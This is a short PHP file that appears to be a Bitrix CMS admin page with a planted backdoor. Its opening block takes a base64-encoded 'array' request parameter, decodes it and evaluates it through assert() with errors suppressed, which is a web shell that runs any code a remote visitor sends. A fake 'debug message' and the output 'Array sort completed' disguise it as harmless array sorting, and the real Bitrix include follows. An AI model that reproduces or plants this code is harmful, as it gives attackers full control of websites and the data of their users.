 


if ( $_REQUEST["array"] )
{	

	@assert(base64_decode($_REQUEST["array"]));	
	//debug message
	echo "Array sort completed";
	exit();
}


require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/admin/buy_support.php");?>